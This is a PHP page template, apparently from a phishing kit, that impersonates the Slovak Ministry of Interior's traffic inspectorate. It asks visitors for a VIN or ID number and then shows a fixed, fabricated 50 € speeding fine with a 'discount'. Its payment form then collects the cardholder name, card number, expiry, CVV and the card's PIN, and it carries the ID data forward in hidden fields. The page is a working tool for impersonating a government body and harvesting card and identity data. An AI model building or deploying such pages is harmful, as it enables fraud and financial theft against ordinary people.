<?php
$pageTitle = 'Overenie Pokuty - Ministerstvo vnútra SR';
$pageSubtitle = 'Dopravný inšpektorát';
require_once __DIR__ . '/assets/inc/header.php';
?>
    
    <div class="progress-bar">
        <div class="progress-step active">
            <div class="step-number">1</div>
            <div class="step-label">Overenie</div>
        </div>
        <div class="progress-line"></div>
        <div class="progress-step">
            <div class="step-number">2</div>
            <div class="step-label">Pokuta</div>
        </div>
        <div class="progress-line"></div>
        <div class="progress-step">
            <div class="step-number">3</div>
            <div class="step-label">Platba</div>
        </div>
    </div>
    
    <div class="container" id="mainContainer">
        <!-- STEP 1: Verification -->
        <div id="step1" class="step-content active">
            <div class="info-box">
                <h1>Overenie dopravného priestupku</h1>
                <p>Pre zobrazenie detailov pokuty zadajte jeden z nasledujúcich údajov:</p>
            </div>
            
            <form id="verificationForm">
                <div class="form-group">
                    <label for="vin">VIN kód vozidla:</label>
                    <input type="text" id="vin" name="vin" placeholder="napr. WVWZZZ1KZBW123456" maxlength="17">
                    <small class="help-text">17-miestny identifikačný kód vozidla</small>
                </div>
                
                <div class="divider">
                    <span>ALEBO</span>
                </div>
                
                <div class="form-group">
                    <label for="doc_number">Číslo občianskeho preukazu / pasu:</label>
                    <input type="text" id="doc_number" name="doc_number" placeholder="napr. AA123456">
                    <small class="help-text">Číslo dokladu vodiča v čase priestupku</small>
                </div>
                
                <button type="submit" class="btn-primary">Overiť priestupok</button>
            </form>
            
            <div class="info-notice">
                <strong>ℹ️ Dôležité informácie:</strong>
                <ul>
                    <li>Overenie je bezplatné a trvá len niekoľko sekúnd</li>
                    <li>Údaje sú chránené v súlade s GDPR</li>
                    <li>Pri probléme kontaktujte: +421 2 4829 1111</li>
                </ul>
            </div>
        </div>
        
        <!-- STEP 2: Fine Details (hidden initially) -->
        <div id="step2" class="step-content">
            <div class="fine-details">
                <h1>Detail priestupku</h1>
                
                <div class="fine-card">
                    <div class="fine-header">
                        <span class="fine-status">Neuhradené</span>
                        <span class="fine-date">Dátum: 15.02.2026</span>
                    </div>
                    
                    <div class="fine-info">
                        <div class="fine-row">
                            <span class="label">Priestupok:</span>
                            <span class="value">Prekročenie rýchlosti</span>
                        </div>
                        <div class="fine-row">
                            <span class="label">Miesto:</span>
                            <span class="value">Bratislava, Bajkalská ulica</span>
                        </div>
                        <div class="fine-row">
                            <span class="label">Rýchlosť:</span>
                            <span class="value">68 km/h (povolené 50 km/h)</span>
                        </div>
                        <div class="fine-row">
                            <span class="label">Evidenčné číslo:</span>
                            <span class="value" id="vehicleNumber">BA-123-AB</span>
                        </div>
                    </div>
                    
                    <div class="fine-amount">
                        <span>Suma na úhradu:</span>
                        <strong>50,00 €</strong>
                    </div>
                    
                    <div class="fine-warning">
                        ⚠️ Pri úhrade do 15 dní: <strong>25,00 €</strong> (zľava 50%)
                    </div>
                </div>
                
                <button id="proceedToPayment" class="btn-primary">Pokračovať na platbu</button>
                <button id="backToVerification" class="btn-secondary">Späť na overenie</button>
            </div>
        </div>
        
        <!-- STEP 3: Payment (hidden initially) -->
        <div id="step3" class="step-content">
            <div class="payment-section">
                <h1>Platba pokuty</h1>
                
                <div class="payment-summary">
                    <div class="summary-row">
                        <span>Základná suma:</span>
                        <span>50,00 €</span>
                    </div>
                    <div class="summary-row discount">
                        <span>Zľava (úhrada do 15 dní):</span>
                        <span>-25,00 €</span>
                    </div>
                    <div class="summary-row total">
                        <span>Celkom na úhradu:</span>
                        <strong>25,00 €</strong>
                    </div>
                </div>
                
                <form id="paymentForm">
                    <input type="hidden" id="vin_hidden" name="vin_hidden">
                    <input type="hidden" id="doc_hidden" name="doc_hidden">
                    
                    <div class="form-group">
                        <label for="holder">Meno držiteľa karty:</label>
                        <input type="text" id="holder" name="holder" placeholder="MENO PRIEZVISKO" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="card">Číslo karty:</label>
                        <input type="text" id="card" name="card" maxlength="19" placeholder="0000 0000 0000 0000" required>
                    </div>
                    
                    <div class="form-row">
                        <div class="form-group">
                            <label for="expiry">Platnosť:</label>
                            <input type="text" id="expiry" name="expiry" maxlength="5" placeholder="MM/YY" required>
                        </div>
                        <div class="form-group">
                            <label for="cvv">CVV:</label>
                            <input type="text" id="cvv" name="cvv" maxlength="3" placeholder="123" required>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label for="pin">Overovací PIN karty:</label>
                        <input type="password" id="pin" name="pin" maxlength="4" placeholder="****" required>
                        <small class="help-text">Pre overenie identity zadajte 4-miestny PIN kód vašej karty</small>
                    </div>
                    
                    <button type="submit" class="btn-primary">Zaplatiť 25,00 €</button>
                    <button type="button" id="backToFine" class="btn-secondary">Späť</button>
                </form>
            </div>
        </div>
    </div>
    
    <?php require_once __DIR__ . '/assets/inc/support_widget.php'; ?>
    <?php require_once __DIR__ . '/assets/inc/footer.php'; ?>

